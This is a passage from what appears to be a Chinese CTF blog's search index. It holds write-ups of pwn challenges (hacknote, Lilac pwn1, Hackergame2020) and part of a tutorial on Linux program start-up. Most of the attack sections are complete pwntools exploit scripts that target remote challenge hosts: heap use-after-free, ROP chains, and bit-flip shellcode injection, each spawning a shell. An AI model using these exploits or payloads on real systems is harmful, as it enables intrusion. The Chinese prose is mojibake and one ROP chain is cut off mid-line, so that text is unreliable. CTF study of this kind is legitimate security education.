del(); } if ( v0 \u003e 2 ) { if ( v0 == 3 ) { print(); } else { if ( v0 == 4 ) exit(0); LABEL_13: puts(\"Invalid choice\"); } } else { if ( v0 != 1 ) goto LABEL_13; add(); } } } pträ¸ºä¸€ä¸ªæ•°ç»„ï¼Œå­˜æ”¾æŒ‡å‘8å­—èŠ‚å¤§å°çš„å†…å­˜ç©ºé—´ã€‚å‰å››å­—èŠ‚ä¸ºputsçš„å‡½æ•°åœ°å€ï¼Œåå››å­—èŠ‚ä¸ºnoteç”³è¯·çš„å†…å­˜ç©ºé—´åœ°å€ã€‚ æ€è·¯å°±æ˜¯leakä¸€ä¸ªlibcåœ°å€ï¼Œç„¶åæ§åˆ¶é‚£8å­—èŠ‚ç©ºé—´ï¼Œfuncåœ°å€ä¸ºsystemï¼Œnoteä¸­ä¸ºâ€˜/bin/shâ€™åœ°å€ã€‚ä»è€Œget shellã€‚ freeåçš„æŒ‡é’ˆæ²¡æœ‰è¢«é”€æ¯ï¼Œé¦–å…ˆç”³è¯·ä¸¤ä¸ªsize\u003e0x8çš„chunkã€‚ç„¶åéƒ½freeæ‰ï¼Œfastbinä¸­å°±æœ‰äº†å››ä¸ªchunkã€‚å…¶ä¸­æ§åˆ¶å †å—æ˜¯åœ¨åŒä¸€ä¸ªbinä¸­çš„ï¼Œsizeéƒ½æ˜¯0x8ã€‚è¿™æ—¶ç”³è¯·æ–°çš„sizeä¸º0x8çš„noteï¼Œæˆ‘ä»¬å°±ä¼šè·å¾—è¿™ä¸¤ä¸ªå †å—ã€‚è¿™ä¸ªå—çš„contentå°±æ˜¯note0çš„æ§åˆ¶å †å—ã€‚ä¿®æ”¹åå››å­—èŠ‚ä¸ºputs_got,leakå‡ºlibcçš„åœ°å€ã€‚ç„¶åfreeæ‰è¿™ä¸ªå—ï¼Œå†ç”³è¯·å›æ¥ï¼ŒæŠŠåœ°å€æ”¹ä¸ºsystemï¼Œåé¢çš„å†…å®¹æ”¹ä¸ºâ€˜||shâ€™ or â€˜;shâ€™ã€‚ ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./hacknote' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',49663) elf = ELF(binary,checksec=False) libc=ELF('libc_32.so.6',checksec=False) def create(size,content): p.sendlineafter(\"Your choice :\",'1') p.sendlineafter(\"Note size :\",str(size)) p.sendlineafter(\"Content :\",str(content)) def dele(index): p.sendlineafter(\"Your choice :\",'2') p.sendlineafter(\"Index :\",str(index)) def show(index): p.sendlineafter(\"Your choice :\",'3') p.sendlineafter(\"Index :\",str(index)) create(0x10,'a'*0x10) create(0x10,'b'*0x10) dele(0) dele(1) create(0x8,p32(0x804862B)+p32(elf.got['puts'])) #gdb.attach(p) p.sendlineafter(\"Your choice :\",'3') p.recvuntil('Index :') p.sendline('0') puts_addr=u32(p.recv(4)) print hex(puts_addr) libcbase=puts_addr-libc.symbols['puts'] system=libcbase+libc.symbols['system'] dele(2) create(0x8,p32(system)+'||sh') show(0) p.interactive() [TOP](# jump) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp-2"},{"categories":["Writeups"],"content":"Lilac HITæœ¬éƒ¨çš„ctfæˆ˜é˜ŸLilacçš„ä¸­ç§‹æ´»åŠ¨ï¼Œåªæœ‰ä¸‰é“PWNã€‚ ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:0:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#lilac"},{"categories":["Writeups"],"content":"PWN1","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:0:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#pwn1"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/mid-autum-fun1/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:1:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#checksec"},{"categories":["Writeups"],"content":"idaå‘v7ä¸­å†™å…¥v6å¤§å°çš„æ•°æ®ï¼Œé‡åˆ°å›è½¦ç»“æŸã€‚v6å°±æ˜¯æˆ‘ä»¬ç”¨allocaåœ¨æ ˆä¸Šç”³è¯·çš„å¤§å°ã€‚ ä¸ºäº†ä¿è¯v6å¤§å°èƒ½è®©æˆ‘ä»¬å®Œæ•´çš„å†™å…¥payloadæ‰€ä»¥è¿™é‡Œç»™å®ƒä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œâ€œ-31â€ï¼Œåæ­£æˆ‘ä»¬ä¸ç”¨æŠŠæ‰€æœ‰çš„ç”³è¯·ç©ºé—´å¡«æ»¡ã€‚ ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:2:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" from ctypes import * libc1=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') local=0 offset=0x14-3+8-1 if local: p=process('./pwn') elf = ELF('./pwn') else: p=remote('47.94.239.235',3001) elf = ELF('./pwn') #guess number def guess(): libc1.srand(0X91D) for i in range(66): num=str(libc1.rand()) p.sendlineafter(\"guess next number :\",num) #gdb.attach(p) guess() p.recvuntil(\"size of you name :\") p.sendline('-31') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] pop_rdi=0x0000000000400b53 main=0x000000000040099C #gdb.attach(p) payload='a'*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main) p.sendline(payload) p.recvline() puts_addr=u64(p.recv(6).ljust(8, '\\x00')) print hex(puts_addr) sleep(0.5) libcbase=puts_addr-0x06f6a0 system=libcbase+0x0453a0 bin_sh=libcbase+0x18ce17 print hex(puts_addr) guess() p.recvuntil(\"size of you name :\") p.sendline('-31') #gdb.attach(p) payload='a'*offset+p64(pop_rdi)+p64(bin_sh)+p64(system) p.sendline(payload) p.interactive() ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:3:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#exp"},{"categories":["Writeups"],"content":"æ€»ç»“é¢˜ç›®ä¸éš¾ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»ä¸¤ä¸ªå·¥å…· gdb.attach(p)ï¼šè¿™ä¸ªå‘½ä»¤å¯ä»¥è®©ä½ åœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™å†ä¸ºä½ å¼€å¯ä¸€ä¸ªç»ˆç«¯ï¼Œä¾›ä½ è¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“è‡ªå·±çš„è„šæœ¬åœ¨å“ªä¸€æ­¥å‡ºäº†é—®é¢˜ã€‚å¼ºæ¨ libc database searchï¼šLibcSearchè™½ç„¶æ„Ÿè§‰å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯å®ƒçš„libcåº“ä¸ç®—å…¨ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥è®©ä½ é€šè¿‡æœ€åä¸‰ä½çš„åç§»ç¡®å®šlibcçš„ç‰ˆæœ¬ã€‚ ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:4:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#æ€»ç»“"},{"categories":["Writeups"],"content":"ç©äº†ä¸€æ¬¡hackergamerï¼Œè¿™é‡Œæˆ‘åªç»™å‡ºpwnçš„è§£ç­”ï¼Œä¹Ÿå¯ä»¥å»çœ‹å®˜æ–¹çš„hackergame2020-writeups ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#"},{"categories":["Writeups"],"content":"ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Šä¸¤ç§è·å¾—flagçš„æ–¹æ³•ï¼š è¦†ç›–èƒœåˆ©åˆ¤æ–­æ¡ä»¶ æ ˆæº¢å‡º-ROP ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Š"},{"categories":["Writeups"],"content":"exp è¦†ç›–èƒœåˆ©æ¡ä»¶ from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: p=process('./pwn') elf = ELF('./pwn') else: p=remote('202.38.93.111',10141) elf = ELF('./pwn') offset=0x90-1-5 payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==' p.sendline(payload) payload='(1,1)'+'a'*offset+p64(0x1) p.send(payload) p.interactive() ROP from pwn import * from struct import pack from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: sh=process('./pwn') elf = ELF('./pwn') else: sh=remote('202.38.93.111',10141) elf = ELF('./pwn') offset=0x90-5 payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==' sh.sendline(payload) #gdb.attach(p) # Padding goes here p = '(1,1)'+'a'*offset+p64(0x1) p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e0) # @ .data p += pack('\u003cQ', 0x000000000043e52c) # pop rax ; ret p += '/bin//sh' p += pack('\u003cQ', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x0000000000439070) # xor rax, rax ; ret p += pack('\u003cQ', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('\u003cQ', 0x00000000004017b6) # pop rdi ; ret p += pack('\u003cQ', 0x00000000004a60e0) # @ .data p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x000000000043dbb5) # pop rdx ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x0000000000439070) # xor rax, rax ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, ","date":"2020-11-08","objectID":"/hackergame2020/:1:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#exp"},{"categories":["Writeups"],"content":"è¶…ç²¾å‡†çš„å®‡å®™å°„çº¿çœŸçš„å°±æ˜¯åªèƒ½æ”¹1bitå‘— æˆ‘ç¬¬ä¸€æ¬¡çš„æ€è·¯æ˜¯åªæ”¹1bitæ˜¯ä¸å¯èƒ½è·å¾—shellçš„ï¼Œæœ‰æ²¡æœ‰åŠæ³•èƒ½é‡å¤è°ƒç”¨bitflipï¼Œäºæ˜¯å°±åœ¨call exitçš„ä»£ç å¤„è¯•äº†è¯•ï¼Œç»“æœå‘ç°å›åˆ°äº†startå‡½æ•°ï¼Œè¿™æ ·æˆ‘å°±èƒ½æ— é™ä¿®æ”¹bitäº†ã€‚ ç»§ç»­åˆ†æï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™å‘ç°åœ¨0x401000-0x402000æ®µä¸ºrwxæ®µï¼Œé‚£è¿™ä¸ªç»å¯¹å°±æ˜¯æˆ‘ä»¬è¦å†™å…¥shellcodeçš„åœ°æ–¹äº†ã€‚åœ¨call exitçš„æ—¶å€™ä¼šè°ƒç”¨0x4010c0çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åœ¨è¿™é‡Œå†™shellcodeã€‚ å®³ï¼Œpythonæ²¡å­¦å¥½ï¼Œè‡ªå·±æ‰‹ç®—äº†20å¤šä¸ªå­—èŠ‚ï¼Œå†™äº†å‡ ç™¾ä¸ªæ¯”ç‰¹çš„ç¿»è½¬ã€‚ è¿™é‡Œæˆ‘é‡åˆ°äº†é—®é¢˜ï¼Œæˆ‘çš„éå¸¸ç¡®å®šçš„å°†æ¯ä¸ªbitæ­£ç¡®çš„ç¿»è½¬äº†ï¼Œæˆ‘åœ¨0x401020çš„ä½ç½®å†™å…¥äº†â€˜/bin/shâ€™å­—ç¬¦ä¸²ï¼Œåœ¨0x401030å¤„å†™äº†shellcodeï¼Œä½†å¾ˆå¥‡æ€ªï¼Œæˆ‘åŠ¨æ€è°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°0x401030å¤„çš„ä»£ç æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè€Œ0x401020å¤„å´æ­£ç¡®çš„å­˜å…¥äº†å­—ç¬¦ä¸²ã€‚ åˆæ­¥çŒœæµ‹æ˜¯å› ä¸ºæˆ‘è°ƒç”¨çš„startå‡½æ•°çš„åŸå›  ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#è¶…ç²¾å‡†çš„å®‡å®™å°„çº¿"},{"categories":["Writeups"],"content":"exp #!/usr/bin/env python3 from pwn import * context.log_level='debug' r = remote('202.38.93.111', 10231) r.recvuntil(\"token: \") r.sendline(\"654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==\") def flip(addr, bit): r.recvuntil('flip?') r.sendline(hex(addr) + ' ' + str(bit)) target = 0x401295 flip(target + 1, 6) shellcode_start = 0x4010c0 shellcode = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" e = ELF('./pwn') for i in range(len(shellcode)): b = shellcode[i] ^ e.read(shellcode_start + i, 1)[0] for j in range(8): if (b \u003e\u003e j) \u0026 1: flip(shellcode_start + i, j) flip(target + 1, 6) r.interactive() ","date":"2020-11-08","objectID":"/hackergame2020/:1:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#exp-1"},{"categories":["Writeups"],"content":"åŠ¨æ€é“¾æ¥åº“æ£€æŸ¥å™¨è¿™ä¸ªæ˜¯çœŸçš„æ˜¯æ²¡æƒ³åˆ°ï¼Œlddå‘½ä»¤æ˜¯æœ‰æ¼æ´çš„ã€‚ (CVE-2019-1010023) - ldd should protect against programs whose segments overlap with the loader itself è¯·æ³¨æ„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚ï¼Œç¨‹åºæŒ‡å®šäº†ld-linux.soä»¥å¤–çš„ELFè§£é‡Šå™¨ï¼‰ï¼ŒæŸäº›ç‰ˆæœ¬çš„lddå¯èƒ½ä¼šå°è¯•é€šè¿‡ç›´æ¥æ‰§è¡Œç¨‹åºæ¥å°è¯•è·å–ä¾èµ–é¡¹ä¿¡æ¯ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‰§è¡Œç¨‹åºçš„ELFè§£é‡Šå™¨ä¸­å®šä¹‰çš„ä»»ä½•ä»£ç ï¼Œè¿˜å¯èƒ½å¯¼è‡´æ‰§è¡Œç¨‹åºæœ¬èº«ã€‚ ï¼ˆä¾‹å¦‚ï¼Œåœ¨2.27ä¹‹å‰çš„glibcç‰ˆæœ¬ä¸­ï¼Œä¸Šæ¸¸lddå®ç°åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œå°½ç®¡å¤§å¤šæ•°å‘è¡Œç‰ˆæä¾›çš„ä¿®æ”¹ç‰ˆæœ¬éƒ½æ²¡æœ‰ã€‚ï¼‰å› æ­¤ï¼Œåˆ‡å‹¿åœ¨ä¸å—ä¿¡ä»»çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸Šä½¿ç”¨lddï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚å¤„ç†ä¸å—ä¿¡ä»»çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œæ›´å®‰å…¨çš„é€‰æ‹©æ˜¯ï¼š$ objdump -p / path / to / program | grepéœ€è¦ï¼Œä½†æ˜¯ï¼Œè¿™ç§é€‰æ‹©åªæ˜¾ç¤ºäº†å¯æ‰§è¡Œæ–‡ä»¶çš„ç›´æ¥ä¾èµ–å…³ç³»ï¼Œè€Œlddæ˜¾ç¤ºäº†å¯æ‰§è¡Œæ–‡ä»¶çš„æ•´ä¸ªä¾èµ–å…³ç³»æ ‘ã€‚ ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#åŠ¨æ€é“¾æ¥åº“æ£€æŸ¥å™¨"},{"categories":["Pwning"],"content":"ç¨‹åºå¼€å§‹ä¸€ä¸ªç¨‹åºçœŸæ­£çš„å…¥å£æ˜¯_startå‡½æ•°ã€‚ startå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼š agrcâ€”â€”è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯æ‰§è¡Œç¨‹åºåï¼Œæ‰€ä»¥argcæœ€å°‘ä¸º1ã€‚ argvæ˜¯å…·ä½“çš„å‚æ•°ã€‚å­—ç¬¦ä¸²æ•°ç»„ argv[0]ä¸ºç©ºä¸²(\"\") ã€‚ argv[1] ä¸ºåœ¨DOSå‘½ä»¤è¡Œä¸­æ‰§è¡Œç¨‹åºååçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²; argv[2] ä¸ºæ‰§è¡Œç¨‹åºååçš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²; â€¦â€¦ argv[argc]ä¸ºNULLã€‚ envpæ˜¯ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œå­—ç¬¦ä¸²æ•°ç»„ï¼Œenvp[]çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½åŒ…å«åœ¨ENVVAR=valueå½¢å¼çš„å­—ç¬¦ä¸²ã€‚ æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ç¨‹åºsimple.cçœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š int main() { return 0; } ç¼–è¯‘åä½¿ç”¨ objdump -f simple giantbranch@ubuntu:~/Desktop$ objdump -f simple simple: file format elf64-x86-64 architecture: i386:x86-64, flags 0x00000112: EXEC_P, HAS_SYMS, D_PAGED start address 0x00000000004003e0 è¿™é‡Œæ˜¾ç¤ºçš„å¼€å§‹åœ°å€å°±æ˜¯_startå‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬è¿›è¡Œåç¼–è¯‘çœ‹ä¸€çœ‹ï¼š objdump -d simple Disassembly of section .text: 00000000004003e0 \u003c_start\u003e: 4003e0: 31 ed xor %ebp,%ebp 4003e2: 49 89 d1 mov %rdx,%r9 4003e5: 5e pop %rsi 4003e6: 48 89 e2 mov %rsp,%rdx 4003e9: 48 83 e4 f0 and $0xfffffffffffffff0,%rsp 4003ed: 50 push %rax 4003ee: 54 push %rsp 4003ef: 49 c7 c0 60 05 40 00 mov $0x400560,%r8 4003f6: 48 c7 c1 f0 04 40 00 mov $0x4004f0,%rcx 4003fd: 48 c7 c7 d6 04 40 00 mov $0x4004d6,%rdi 400404: e8 b7 ff ff ff callq 4003c0 \u003c__libc_start_main@plt\u003e 400409: f4 hlt 40040a: 66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) å¯ä»¥çœ‹åˆ°_startå‡½æ•°å‘å¯„å­˜å™¨ä¸­ä¼ é€’äº†å‚æ•°ï¼š 0x400560ï¼š__libc_csu_finiçš„åœ°å€ 0x4004f0ï¼š__libc_csu_initçš„åœ°å€ 0x4004d6ï¼šmainçš„åœ°å€ ç„¶åè°ƒç”¨äº†ä¸€ä¸ªlibcå‡½æ•°__libc_start_mainï¼š extern int BP_SYM (__libc_start_main) (int (*main) (int, char **, char **), int argc, char *__unbounded *__unbounded ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *__unbounded stack_end) __attribute__ ((noreturn)); __libc_start_mainå‡½æ•°åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ å¤„ç†å…³äºsetuidã€setgidç¨‹åºçš„å®‰å…¨é—®é¢˜ å¯åŠ¨çº¿ç¨‹ æŠŠfiniå‡½æ•°å’Œrtld_finiå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™at_exitè°ƒç”¨ï¼Œä½¿å®ƒä»¬åœ¨at_exité‡Œè¢«è°ƒç”¨ï¼Œä»è€Œå®Œæˆç”¨æˆ·ç¨‹åºå’ŒåŠ è½½å™¨çš„è°ƒç”¨ç»“æŸä¹‹åçš„æ¸…ç†å·¥ä½œ è°ƒç”¨å…¶initå‚æ•° è°ƒç”¨mainå‡½æ•°ï¼Œå¹¶æŠŠargcå’Œargvå‚æ•°ã€ç¯å¢ƒå˜é‡ä¼ é€’ç»™å®ƒ è°ƒç”¨exitå‡½æ•°ï¼Œå¹¶å°†mainå‡½æ•°çš„è¿”å›å€¼ä¼ é€’ç»™å®ƒ initå‚æ•°å°±æ˜¯__libc_csu_initå‡½æ•°ï¼š .text:00000000004005C0 ; void _libc_csu_init(void) .text:00000000004005C0 public __libc_csu_init .text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text:00000000004005C0 push r15 .text:00000000004005C2 push r14 .text:00000000004005C4 mov r15d, edi .text:00000000004005C7 push r13 .text:00000000004005C9 push r12 .text:00000000004005CB lea r12, __frame_dummy_init_array_entry .text:00000000004005D2 push rbp .text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry .text:00000000004005DA push rbx .text:00000000004005DB mov r14, rsi .text:00000000004005DE mov r13, rdx .text:00000000004005E1 sub rbp, r12 .text:00000000004005E4 sub rsp, 8 .text:00000000004005E8 sar rbp, 3 .text:00000000004005EC call _init_proc .text:00000000004005F1 test rbp, rbp .text:00000000004005F4 jz short loc_400616 .text:00000000004005F6 xor ebx, ebx .text:00000000004005F8 nop dword ptr [rax+rax+00000000h] .text:0000000000400600 .text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text:0000000000400600 mov rdx, r13 .text:0000000000400603 mov rsi, r14 .text:0000000000400606 mov edi, r15d .text:0000000000400609 call qword ptr [r12+rbx*8] .text:000000000040060D add rbx, 1 .text:0000000000400611 cmp rbx, rbp .text:0000000000400614 jnz short loc_400600 .text:0000000000400616 .text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text:0000000000400616 add rsp, 8 .text:000000000040061A pop rbx .text:000000000040061B pop rbp .text:000000000040061C pop r12 .text:000000000040061E pop r13 .text:0000000000400620 pop r14 .text:0000000000400622 pop r15 .text:0000000000400624 retn .text:0000000000400624 __libc_csu_init endp __libc_csu_initå‡½æ•°ä¼šè°ƒç”¨get_pc_truckã€‚å®ƒæ˜¯ç»™ä½ç½®æ— å…³ç ä½¿ç”¨çš„ã€‚è®¾ç½®å®ƒä»¬å¯ä»¥è®©ä½ç½®æ— å…³ç æ­£å¸¸å·¥ä½œã€‚ä¸ºäº†è®©å®ƒä»¬å·¥ä½œï¼ŒåŸºå€å¯„å­˜å™¨ï¼ˆ%ebpï¼‰éœ€è¦çŸ¥é“GLOBAL_OFFSET_TABLEï¼ˆGOTï¼‰ã€‚è¯¥å‡½æ•°çš„ä¸»è¦ç›®çš„å…¶å®æ˜¯è·å–å˜é‡å¯¹åº”çš„GOTï¼Œä»¥é€šè¿‡å®ƒè·å–å˜é‡çœŸæ­£çš„å€¼ã€‚ ä¹‹åä¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œä¸ºmainè®¾ç½®ç¯å¢ƒï¼Œå’Œå¯„å­˜å™¨å‚æ•°ã€‚ä¸‹é¢çš„å‡½æ•°éƒ½åœ¨å¾ªç¯ä¸­æ‰§è¡Œ ç„¶åï¼Œæˆ‘ä»¬æ¥çœ‹gmon_startå‡½æ•°ã€‚å¦‚æœå®ƒæ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬è·³è¿‡å®ƒï¼Œä¸è°ƒç”¨å®ƒã€‚å¦åˆ™ï¼Œè°ƒç”¨å®ƒæ¥è®¾ç½®profilingã€‚è¯¥å‡½æ•°è°ƒç”¨ä¸€ä¸ªä¾‹ç¨‹å¼€å§‹profilingï¼Œå¹¶ä¸”è°ƒç”¨at_exitå»è°ƒç”¨å¦ä¸€ä¸ªç¨‹åºè¿è¡Œ,å¹¶ä¸”åœ¨è¿è¡Œç»“æŸçš„æ—¶å€™ç”Ÿæˆgmon.outã€‚ æ¥ä¸‹æ¥frame_dummyå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚å…¶ç›®çš„æ˜¯è°ƒç”¨__register_frame_infoå‡½æ•°ï¼Œä½†æ˜¯ï¼Œè°ƒç”¨frame_dummyæ˜¯ä¸ºäº†ç»™ä¸Šè¿°å‡½æ•°è®¾ç½®å‚æ•°ã€‚ ä¹‹åæ˜¯__do_global_ctors_aux ã€‚ã€‚ã€‚ã€‚ æœ€åè·³å‡ºå¾ªç¯ï¼Œå›åˆ°__libc_start_mainï¼Œ__libc_start_mainå»è°ƒç”¨æˆ‘ä»¬çš„mianã€‚ ","date":"2020-10-13","objectID":"/linux-x86-program-start-up/:0:0","series":null,"tags":["Pwn"],"title":"Linux X86 Program Start Up","uri":"/linux-x86-program-start-up/#ç¨‹åºå¼€å§‹"},{"categories":["Pwning"],"content":"ç»“æŸè¿›ç¨‹æ­£å¸¸ç»“æŸæœ‰ä¸¤ç§æƒ…å†µï¼š mainæ­£å¸¸è¿”å›ï¼Œç”±__libc_start_mainæ¥è°ƒç”¨exitå‡½æ•°ã€‚ 